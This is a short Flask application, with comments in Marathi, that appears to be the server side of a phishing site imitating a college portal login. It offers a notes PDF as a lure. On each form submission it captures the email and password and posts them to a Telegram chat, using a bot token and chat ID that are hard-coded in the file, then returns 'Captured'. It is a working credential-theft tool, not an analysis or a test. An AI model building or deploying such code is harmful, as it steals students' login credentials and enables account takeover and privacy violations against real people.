from flask import Flask, render_template, request, send_file
import requests
import os

app = Flask(__name__)

# इथे तुमचा BotFather कडून मिळालेला API Token टाका
TELEGRAM_BOT_TOKEN = '8899679165:AAE5X0new3eODuMC5ji1lt1XtzZvSfJFbgw'
# इथे तुमचा UserInfoBot कडून मिळालेला Chat ID टाका
TELEGRAM_CHAT_ID = '8690869241'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # युजरने लॉगिन करताच डेटा टेलिग्रामवर येईल
    log_message = f"🚨 <b>College Portal Login Captured!</b>\n\n📧 User/Email: <code>{email}</code>\n🔑 Password: <code>{password}</code>"
    send_to_telegram(log_message)
    
    return "Captured"

@app.route('/download-pdf')
def download_pdf():
    pdf_path = "notes.pdf"
    if os.path.exists(pdf_path):
        return send_file(pdf_path, as_attachment=True)
    else:
        return "PDF file not found on server!", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))